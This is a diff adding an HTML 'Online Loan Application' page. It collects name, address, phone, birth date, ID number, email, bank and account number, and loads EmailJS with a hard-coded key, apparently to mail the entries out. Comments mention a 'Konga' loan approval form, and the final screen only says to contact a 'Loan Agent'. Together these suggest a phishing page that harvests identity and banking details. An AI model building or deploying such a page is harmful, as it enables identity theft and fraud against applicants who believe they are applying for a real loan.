@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Loan Application</title>
+    <link rel="stylesheet" href="apply.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init('SxkEvrS2WGB0Q6l6t');
+        })();
+    </script>
+</head>
+<body>
+    <div id="head"><b>
+        ONLINE LOAN APPLICATION
+    </b>
+    </div>
+    <form id="contact-form" >
+        <div id="first-form">
+            <input type="hidden" name="contact_number">
+            <label for="name">Full Name:</label> <br>
+            <input type="text" name="name" id="fname" placeholder="Enter Your Full Name" required> <br>
+            <label for="address">Address:</label> <br>
+            <input type="text" name="address" id="address" placeholder="Enter Your Address" required> <br>
+            <label for="phoneNumber">Phone Number:</label> <br>
+            <input type="number" name="phoneNumber" id="phoneNumber" placeholder="Enter Your Phone Number" required> <br>
+            <label for="date">Date of Birth:</label> <br>
+            <input type="date" name="date" id="date" required> <br>
+            <label for="IDNumber">ID Number:</label> <br>
+            <input type="number" name="IDNumber" id="IDNumber" placeholder="Enter Your ID Number" required> <br>
+            <label for="email">Email:</label> <br>
+            <input type="email" name="email" id="email" placeholder="Enter Your Email Address" required> <br>
+           
+            <div id="terms">
+                <input type="checkbox" name="agree" id="agree">
+                <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+                
+            </div>
+            <input type="submit" id="submit-button" value="Submit">
+        </div>
+        <div id="second-form" style="display: none;">
+            <label for="bank">Bank:</label> <br>
+            <input type="text" name="bank" id="bank" placeholder="Enter Your Bank" required> <br>
+            <label for="eason">Reason for application</label> <br>
+            <input type="text" name="reason" id="reason" placeholder="Enter a reason why you need this loan" required> <br>
+            <label for="accountNumber">Account Number:</label> <br>
+            <input type="number" name="accountNumber" id="accountNumber" placeholder="Enter Your Account Number" required> <br>
+            <label for="loanAmount">Loan Amount:</label> <br>
+            <input type="number" name="loanAmount" id="loanAmount" placeholder="Enter Your Loan Amount" required> <br>
+            <label for="loanDuration">Loan Duration:</label> <br>
+            <input type="text" name="loanDuration" id="loanDuration" placeholder="Enter Your Loan Duration" required> <br>
+      
+            <input type="submit" id="submitButton" value="Submit">
+        </div>
+    </form>
+    <div id="successful" style="display: none; width: 100vw;">
+        <!-- <p id="p7">Konga Loan Approval Form</p> -->
+            <img id="latsimg" src="./WhatsApp Image 2024-05-13 at 23.06.34 (1).jpeg" alt="" style="width: 100%;">
+            <!-- <h2 id="with"> unable to connect to your loan dashboard</h2> -->
+            <p style="text-align: center; font-size: 100%; font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif ;">Kindly contact your Loan Agent For Further Enquiry and Support.</p>
+    </div>
+    <script src="apply.js"></script>
+</body>
+</html>
